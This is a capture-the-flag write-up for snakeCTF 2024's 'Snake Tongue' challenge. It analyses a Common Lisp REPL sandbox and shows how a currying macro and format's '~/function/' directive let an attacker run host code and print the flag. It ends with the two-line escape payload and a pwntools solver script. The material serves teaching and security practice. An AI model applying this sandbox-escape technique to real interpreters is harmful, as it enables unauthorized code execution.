# Snake Tongue [_snakeCTF 2024 Quals_]

**Category**: misc

## Description

I've seen parentheses you people wouldn't believe.

### Hints

No hints provided

## Solution

The challenge is implemented in Common Lisp and compiled with sbcl, as indicated by the provided Dockerfile.

A REPL is presented to the user, accepting expressions as input.

The program's entrypoint is the `main` function:

```cl
(defun main ()
  (set-dispatch-macro-character #\# #\. #'(lambda (s x y) (declare (ignore s x y)) nil))
  (defparameter *flag* (let ((flag (uiop:getenv "FLAG")))
                 (if flag
                 flag
                 "REDACTED")))
  (repl))
```

First, `set-dispatch-macro-character` overwrites the default behaviour of the `#.` reader macro. Reader macros in Common Lisp are expanded at read-time into some code. By default, `#.` calls a [function](https://www.lispworks.com/documentation/HyperSpec/Body/02_dhf.htm) which evaluates the code passed to it at read-time. For example, `#.(+ 1 1)` evaluates directly to 2. The redefinition of `#.` in `main` prevents trivial arbitrary code execution.

Then, the flag is loaded from the environment into a *global* variable named `*flag*` and finally the REPL is started.

First, `init-please` performs some kind of initialization, which will be analysed later. Second, the actual Read Eval Print Loop is executed:

```cl
(loop while t
	do (format t "~&>>> ")
	   (finish-output)
	   (princ (please (read) nil)))
```

The built-in functions `read`, `loop`, `princ` obviously implement the 'Read', 'Loop' and 'Print' part, while the 'Eval' is taken care of by `please`. This function is the interpreter of the expressions that can be provided as input. Here it is important to understand that [`read`](https://www.lispworks.com/documentation/HyperSpec/Body/f_rd_rd.htm) parses a Common Lisp expression from standard input, meaning that if `(+ 1 1)` is passed to the REPL, the parameter `x` of `please` will be exactly `(+ 1 1)`, which **has not been evaluated yet**. Why is this important? Because it means that `please` is an interpreter for a dialect of Lisp, and expressions can be symbols such as `a`, atoms such as `1` or `"foo"` or 's-expressions' such as `(foo 1 2 3)`. In fact, `please` checks exactly of which kind its `x` argument is. In particular, if `x` is an 's-expression', it is further analysed to understand how it should be interpreted. To do this `case` is used, which implements different conditional branches based on the *code* it is given. `case` is a *macro*, so it handles directly the code it receives as input without evaluating it. The different branches of `case` are chosen based on the first element of `x`, so if `x` is `(+ 1 1)`, `(first x) = +`.

```cl
(defun please (x &optional env)
  (cond
    ((null x) nil)
    ((symbolp x)
     (gar x env))
    ((atom x) x)
    ((case (first x)
       (8 (second x))
       (1 (lastl (mapcar #'(lambda (y) (please y env)) (rest x))))
       (2 (sar! (second x) (please (third x) env) env))
       (<> (if (please (second x) env)
	       (please (third x) env)
	       (please (fourth x) env)))
       (? (let ((parms (second x))
		(code (cofree-comonad-absolutely '1 (rest2 x))))
	    (lambda (&rest args)
	      (please code (letsgo parms args env)))))
       (! (let ((name (second x))
		(args (list (first (third x))))
		(body (cdddr x)))
	    (eval `(dhc ,name ,args ,@body))))
       (t
        (apply (please (first x) env)
               (mapcar #'(lambda (v) (please v env)) (rest x))))))))
```

The accepted expressions are (using `<something>` to represent a possible argument for the expression):

- `(8 <something>)` which will return exactly `<something>`. E.g. `(8 a) = a`, `(8 1) = 1`, `(8 (1 2 john "doe")) = (1 2 john "doe")`
- `(1 <expr1> <expr2> ... <exprn>)` which will evaluate `<expr1>` to `<exprn>` using `please`, returning the result of `<exprn>`. This acts as a [`progn`](https://www.lispworks.com/documentation/HyperSpec/Body/s_progn.htm), evaluating the given expressions in sequence
- `(2 <somename> <someval>)` calls `sar!` passing `<somename>` and the evaluation of `<someval>`. `sar!` effectively sets a global variable in the interpreter's environment, so `(2 foo 1)` creates a variable `foo` with value `1` which can be used in the REPL
- `(<> <cond> <then> <else>)` implements a simple `if` check
- `(? <parms> <code>)` acts as a `lambda`: `<parms>` are the arguments of the lambda function, stored in the `parms` local variable and `<code>` its body. The call to `cofree-comonad-absolutely` in practice adds a `1` to the `<code>` block, which will be interpreted by `please` later as seen before. The call to `letsgo` binds the `args` list of the lambda function with the `<parms>` passed by the user to allow for a correct evaluation
- `(! <name> <args> <body>)` looks like a function definition like it can be done normally with `defun`, but involves the evaluation of the `dhc` macro. This will be explained better later
- Finally, any other kind of expression passed to `please` is assumed to be a function call: the function name is searched for in the interpreter environment, and its arguments are first evaluated, then passed to it

The interpretation of `!` involves the evaluation of `dhc`, which is a macro defined in the challenge. Specifically, the call to ``(eval `(dhc ,name ,args ,@body))`` uses the backtick to create a *symbolic expression* in which only the terms with a `,` in front of them are evaluated. The result is a call to `(eval (dhc <evaluated name> <evaluated args> <evaluated body clause 1> ... <evaluated body clause n>)`. This is done because since `dhc` is a macro, passing only `name` to it would prevent its evaluation, meaning that inside `dhc` only the *symbol* `name` can be seen and not its value, like "foo". **Mind that `args` will always contain at most one element, because of the call to `(first (third x))`, so only functions of one argument can be defined**. At this point, what does `dhc` do? Here the commented code:

```cl
(defmacro dhc (name args &body body)
  (if (fboundp name)
      ;; If NAME refers already to a defined function, raise an error
      (error "Can't do that, sorry")
      ;; Otherwise, define a local function named SPICES
      (labels ((spices (params body)
		 (if (null params)
             ;; In case there are no parameters, return only the expanded body
		     `(progn ,@body)
             ;; Otherwise return a function with one parameter, the first of the
             ;; PARAMS list, and recursively call SPICES, effectively creating a 'chain' of
             ;; lambdas of one parameter
		     `(lambda (,(car params))
			    ,(spices (cdr params) body)))))
        ;; Define a function with the given NAME that takes any number
        ;; of parameters: it gets 'expanded' in a chain of lambdas of one
        ;; parameter using SPICES, which are then called one after the other by
        ;; reducing FUNCALL over ARGS
	    `(defun ,name (&rest args)
	        (reduce #'funcall args :initial-value ,(spices args body))))))
```

In practice, a call to `(dhc foo (a b c) (+ a b c))` is transformed to:

```cl
(defun foo (&rest args)
    (reduce #'funcall args :initial-value
        (lambda (a)
            (lambda (b)
                (lambda (c)
                    (progn (+ a b c)))))))
```

**Amazing right?** Now `foo` can be partially applied, like `(foo 1)` and a new function is given as result, while `(foo 1 2 3)` evaluates to 6 directly. This is called [Currying](https://en.wikipedia.org/wiki/Currying), and `dhc` allows curried functions to be defined in a similar way to Haskell. This also means that a call to

`(dhc foo (a)
    (lambda (b)
        (lambda (c)
            (+ a b c))))`

Allows `(foo 1 2 3)` to be called even if `foo` was defined as a one-argument function. Using Currying, a function of two arguments is equivalent to a function of one argument returning a function of one argument, and vice-versa.

Notice now that the `dhc` macro eventually expands to `defun`. The key thing is that `defun` does define a function in the *environment in which the interpreter is run*, not in the environment that is built-into the interpreter! Defining a function via `!` in the REPL (which is `dhc` in disguise) does not alter the `env` argument of `please`, so it cannot be called directly from the REPL. Note also that in `please`, when `!` is interpreted, the `args` and `body` are not evaluated further with `please`, meaning that it is possible to write something like:

`(! foo ()
    (princ *flag*))`

Even if `princ` and `*flag*` are **not** accessible from the REPL! Being able to call a function like `foo` would solve the challenge, but as already seen this is not possible from the REPL.

Here comes into play the `init-please` function that was left behind. The function calls `cope` on all the elements of `*dealwithit*`, which is a global list. Here follows the commented code of `cope`:

```cl
(defun cope (f)
  (if (listp f)
      ;; If F is a list (of two elements)
      (if (functionp (second f))
          ;; If the second element of F is a Common Lisp function, assign it to the
          ;; first element of F, which is assumed to be a name. This makes the function
          ;; present in (second f) available in the interpreter under the name specified in
          ;; (first f)
          (sgar! (first f) (symbol-function (second f))) 
          ;; Otherwise, (second f) is just a value like 1 or "foo", and is
          ;; assigned to the name in (first f)
          (sgar! (first f) (second f)))
      ;; Otherwise, return the function directly
      (sgar! f (symbol-function f))))
```

So `init-please` takes the only element of `*dealwithit*`, which is the function symbol `format`, and makes it available in the environment of `please`. This effectively allows the user to call the built-in `format` function.

It should not be a surprise that `format` can do *weird* stuff using [format specifiers](https://www.lispworks.com/documentation/HyperSpec/Body/22_c.htm). In fact, there is the possibility to [call a function](https://www.lispworks.com/documentation/HyperSpec/Body/22_ced.htm) when the `format` input string is evaluated, using `(format nil "~/function-name/" nil)`. The called function must take four arguments, as it is stated in the Common Lisp documentation. Here is where `!` and Currying come handy: `!` allows a function of **one** argument to be defined in the interpreter's environment via `dhc`, and such function can use anything from Common Lisp. Currying makes it possible to define a function of four arguments, as it is needed by `format`, with nested lambda functions. Then, to read the flag, the following can be provided as input in the REPL:

```
>>> (! printer (a) (lambda (b) (lambda (c) (lambda (d) (princ *flag*)))))
>>> (format nil "~/printer/" nil)
```

### Solver

```python
from pwn import *

context.log_level = "error"

host = args.HOST if args.HOST else "localhost"
port = args.PORT if args.PORT else 1337
ssl = args.SSL if args.SSL else None

r = remote(host=host, port=port)

exploit = [
    b"(! printer (a) (lambda (b) (lambda (c) (lambda (d) (princ *flag*)))))",
    b'(format nil "~/printer/" nil)'
]

for e in exploit:
    r.sendlineafter(b">>> ", e)

# r.interactive()
print(r.recvline().strip().decode())
```
